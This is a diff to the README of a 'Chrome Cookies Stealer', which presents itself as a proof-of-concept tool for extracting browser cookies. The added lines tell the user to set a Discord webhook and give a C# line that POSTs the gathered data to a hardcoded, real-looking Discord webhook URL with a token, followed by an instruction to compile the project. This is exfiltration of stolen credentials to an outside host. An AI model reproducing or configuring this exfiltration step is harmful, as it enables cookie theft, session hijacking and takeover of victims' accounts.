@@ -57,6 +57,12 @@ The **Chrome Cookies Stealer** is a proof-of-concept tool designed to extract co
 
 The tool includes a configuration dictionary (`CONFIGS`) specifying paths to the browser binaries and user data directories. Modify this dictionary if needed to suit your environment.
 
+1. Set webhook in the webhook line 
+ ```c#
+   var response = await client.PostAsync("https://discordapp.com/api/webhooks/1308546230552367154/DlExX-i3vC5ThAkCKfAHNKfDb3hJSegMQYKpGMaWHAxBru2ELvDMydR4RTyVPm_mAKfM", form);
+ ```
+ 
+ 2. compile the project
 ---
 
 ## Prerequisites
